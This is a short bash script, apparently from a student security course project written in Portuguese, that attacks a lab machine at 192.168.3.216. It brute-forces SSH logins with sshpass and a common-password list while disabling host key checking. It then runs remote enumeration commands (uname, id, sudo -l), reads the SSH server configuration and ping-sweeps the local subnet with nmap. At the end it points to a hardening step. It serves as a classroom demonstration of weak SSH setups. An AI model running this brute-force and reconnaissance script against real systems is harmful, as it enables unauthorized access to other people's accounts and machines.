#!/bin/bash

# Demo Vulnerabilidades - Trabalho Final Segurança

TARGET="192.168.3.216"
USER="apolo"

echo "🔴 Demonstrando vulnerabilidades críticas..."

# 1. SSH Brute Force
echo "[1] SSH Brute Force Attack"
for pwd in "admin" "password" "123456" "qwerty" "letmein" "welcome" "monkey" "dragon" "master" "shadow" "12345" "password123" "admin123" "root" "toor" "pass" "test" "guest" "user" "login" "abc123" "123123" "password1" "1234" "12345678" "senha" "123" "1" "2" "3" "4" "5" "6" "7" "8" "9" "123456789"; do
    echo "  Testando: $pwd"
    if sshpass -p "$pwd" ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no \
       $USER@$TARGET "echo 'ACESSO OBTIDO'" 2>/dev/null; then
        echo "  ✅ SUCESSO: Senha '$pwd' funcionou após múltiplas tentativas!"
        break
    fi
done

# 2. Configuração SSH Insegura
echo "[2] SSH Configuration Analysis"
ssh $USER@$TARGET "grep -E '(PermitRootLogin|PasswordAuthentication)' /etc/ssh/sshd_config" 2>/dev/null

# 3. Enumeração Sistema
echo "[3] System Information Gathering"
ssh $USER@$TARGET "uname -a && whoami && id" 2>/dev/null

# 4. Network Discovery
echo "[4] Network Scanning"
nmap -sn 192.168.3.0/24 2>/dev/null | grep "Nmap scan report" | head -5

# 5. Privilege Check
echo "[5] Privilege Escalation Check"
ssh $USER@$TARGET "sudo -l" 2>/dev/null || echo "  Sudo access detected"

# 6. Log Analysis
echo "[6] Security Logs"
ssh $USER@$TARGET "ls -la /var/log/auth.log" 2>/dev/null

echo ""
echo "⚠️  6 vulnerabilidades críticas demonstradas!"
echo "🔧 Execute: make harden (para corrigir)"
